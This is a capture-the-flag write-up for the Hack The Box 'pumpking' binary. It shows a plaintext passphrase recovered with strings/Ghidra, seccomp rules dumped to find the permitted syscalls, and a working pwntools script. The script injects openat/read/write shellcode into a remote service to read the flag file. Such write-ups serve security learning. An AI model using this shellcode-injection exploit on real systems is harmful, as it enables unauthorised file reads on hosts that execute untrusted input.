This binary provides the passphrase in plaintext which we can read with Ghidra or strings. This helps get to step 2 which is the `king()` function.

![image](https://user-images.githubusercontent.com/80063008/198273708-14010505-3529-4abf-ae33-f316e1d69e40.png)

According to Ghidra, if we pass shellcode here (in the king function), it will be executed directly.

![image](https://user-images.githubusercontent.com/80063008/198273739-3845e87e-4b2b-42eb-8dae-a5faa9357cc5.png)

We can figure out what functions we can use for the shellcode using the `seccomp-tools` ... tool.

https://github.com/david942j/seccomp-tools

```bash
seccomp-tools dump ./pumpking
```
![image](https://user-images.githubusercontent.com/80063008/198273832-07507cbe-f1c0-49b3-88e6-53a6d4a65bbf.png)

We see we can use `openat()`, `read()` and `write()`. After openat() is correctly called, the rax will return the fd required for read so we can pass that directly. I found and adjusted this script from a similiar challenge:

https://ctftime.org/writeup/33232


```python
#!/usr/bin/python

from pwn import *
context.log_level = 'warn'
context.clear(arch="amd64") #make sure to define the architecture

p = remote('206.189.117.93', 31444)

shellcode = shellcraft.linux.openat(-2, "/home/ctf/flag.txt")  #fd here is not that important, absolute path is very important (it's in the Dockerfile)
shellcode += shellcraft.linux.read('rax', 'rsp', 80)  #rax gives us the fd required for read()
shellcode += shellcraft.linux.write(1, 'rsp', 80)

p.sendline(b'pumpk1ngRulez') #send passphrase to get to king() function
p.recvuntil(b'>>')
p.sendline(asm(shellcode)) #send shellcode assembly instructions
p.interactive() #profit
```

![image](https://user-images.githubusercontent.com/80063008/198273939-9a244f0b-7af9-48f0-a17e-55b1ac19cf5b.png)

HTB{n4ughty_b01z_d0_n0t_f0ll0w_s3cc0mp_rul3z}